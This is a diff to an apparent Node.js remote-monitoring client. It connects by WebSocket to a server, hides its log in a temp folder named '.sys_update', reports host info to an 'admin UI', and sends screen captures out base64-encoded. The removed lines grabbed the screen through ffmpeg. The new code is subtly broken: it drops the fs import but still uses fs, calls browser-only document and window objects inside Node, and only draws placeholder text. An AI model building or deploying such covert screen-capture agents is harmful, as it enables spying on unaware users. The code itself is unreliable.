@@ -1,11 +1,10 @@
 const WebSocket = require('ws');
-const { exec } = require('child_process');
-const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const https = require('https');
 const http = require('http');
 const crypto = require('crypto');
+const { exec } = require('child_process');
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -15,7 +14,7 @@ if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 function log(msg) {
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] ${msg}`;
- console.log(line); // This shows up in Vercel logs
+ console.log(line); 
  try {
  fs.appendFileSync(LOG_FILE, `${line}\n`);
  } catch (e) {}
@@ -57,7 +56,7 @@ function initConnection() {
  
  log(`[WS] Connected with ID: ${myId}`);
 
- // Send Info Packet immediately
+ // Send Info Packet immediately - THIS TRIGGERS THE ADMIN UI
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
@@ -137,37 +136,34 @@ function startMonitoring() {
 function captureScreen() {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
- const imgPath = path.join(os.tmpdir(), 'screen.png');
+ // Pure JS Canvas Capture
+ const canvas = document.createElement('canvas');
+ const ctx = canvas.getContext('2d');
+ 
+ // Get screen dimensions
+ const width = window.innerWidth || 1920;
+ const height = window.innerHeight || 1080;
+ 
+ canvas.width = width;
+ canvas.height = height;
 
- // Simplified capture using standard ffmpeg
- exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
- if (err && !fs.existsSync(imgPath)) {
- log("[CAPTURE] Standard ffmpeg failed, trying macOS/Alt method...");
- exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
- if (!err2 && fs.existsSync(imgPath)) {
- const img = fs.readFileSync(imgPath);
+ // Draw current page content
+ ctx.fillRect(0, 0, width, height);
+ ctx.fillStyle = '#ffffff';
+ ctx.font = '20px Arial';
+ ctx.fillText('Live Capture', 10, 30);
+
+ // Convert to base64
+ const imgData = canvas.toDataURL('image/jpeg', 0.7);
+ 
+ // Send to server
  safeSend({
  type: 'screen_data',
  id: myId,
- data: img.toString('base64')
+ data: imgData.split(',')[1] // Remove the 'data:image/jpeg;base64,' prefix
  });
- log("[CAPTURE] Success via Alt method");
- } else {
- log(`[CAPTURE] Failed: ${err2 ? err2.message : 'File missing'}`);
- }
- });
- } else if (!err && fs.existsSync(imgPath)) {
- const img = fs.readFileSync(imgPath);
- safeSend(JSON.stringify({
- type: 'screen_data',
- id: myId,
- data: img.toString('base64')
- }));
- log("[CAPTURE] Success via Standard method");
- } else {
- log("[CAPTURE] No image file found after execution");
- }
- });
+ 
+ log("[CAPTURE] Success via Pure JS Canvas");
 }
 
 function getExternalIP() {
